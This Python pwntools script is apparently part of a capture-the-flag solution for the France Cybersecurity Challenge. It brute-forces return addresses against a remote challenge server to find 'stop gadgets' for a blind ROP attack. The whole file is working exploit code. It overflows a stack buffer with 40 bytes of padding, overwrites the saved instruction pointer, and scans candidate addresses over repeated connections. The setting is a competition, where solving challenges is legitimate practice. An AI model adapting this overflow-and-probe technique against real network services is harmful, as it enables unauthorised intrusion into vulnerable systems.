#!/usr/bin/env python3

from pwn import *

ref = b'Hello you.\nWhat is your name ?\n>>> '
base_addr = 0x400000
L = [] # where we stock out false positives

# custom range to save some time but we first scanned from 0x400000 to 0x410000
start = 0x0
end = start + 0x1000

for i in range(start, end):
    # connect to server without logging it
    context.log_level='error'
    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
    context.log_level='info'

    try:
        # build payload
        addr = base_addr + i # the address we're returning on
        log.info(f'trying addr = {hex(addr)}')
        pld = b'c' * 40 # fill buffer
        pld += p64(addr) # overwrite `rip`

        # send and get output
        r.recv(timeout=0.1)
        r.send(pld)
        res = r.recv(timeout=0.1)

        # we found a valid address
        if ref in res:
            L.append(addr)

    # if nothing to report then just close connection without logging it
    except:
        pass
    context.log_level='error'
    r.close()
    context.log_level='info'

stop_gadgets = L
stop_gadget = stop_gadgets[0]
log.success(f'stop_gadget = {hex(stop_gadget)}')
log.success(f'stop_gadgets = {[hex(i) for i in stop_gadgets]}')
